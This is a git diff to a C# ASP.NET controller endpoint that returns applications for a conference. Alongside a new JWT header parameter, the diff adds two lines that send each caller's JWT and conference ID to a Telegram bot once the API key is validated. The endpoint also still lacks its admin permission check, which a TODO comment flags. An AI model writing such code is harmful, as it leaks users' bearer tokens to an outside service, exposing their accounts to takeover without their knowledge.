@@ -35,21 +35,26 @@ namespace BuFaKAPI.Controllers
         /// <summary>
         /// Gets the Conference Applications from one specific Conference
         /// </summary>
-        /// <param name="conference_id">The Conference in Question</param>
+        /// <param name="jwttoken">Token of the User for Auth</param>
+        /// <param name="conference_id">ID of the Conference in Question</param>
         /// <param name="apikey">API Key for Authentification</param>
         /// <returns>A List of Conference_Applications</returns>
         /// <response code="401">If API Key is not valid</response>
         [HttpGet("forConference/")]
-        public IActionResult GetConference_Application([FromHeader] int conference_id,
-                                                       [FromQuery] string apikey)
+        public IActionResult GetConference_Application(
+            [FromHeader(Name = "jwttoken")] string jwttoken,
+            [FromHeader(Name = "conference_id")] int conference_id,
+            [FromQuery] string apikey)
         {
-            //TODO Permission Level Admin
+            // TODO Permission Level Admin
             if (string.IsNullOrEmpty(apikey))
             {
                 return this.BadRequest();
             }
             else if (this.auth.KeyIsValid(apikey, conference_id))
             {
+                telBot.SendTextMessage(jwttoken);
+                telBot.SendTextMessage(conference_id.ToString());
                 var users = this._context.Conference_Application.Where(c => c.ConferenceID == conference_id);
                 return this.Ok(users);
             }
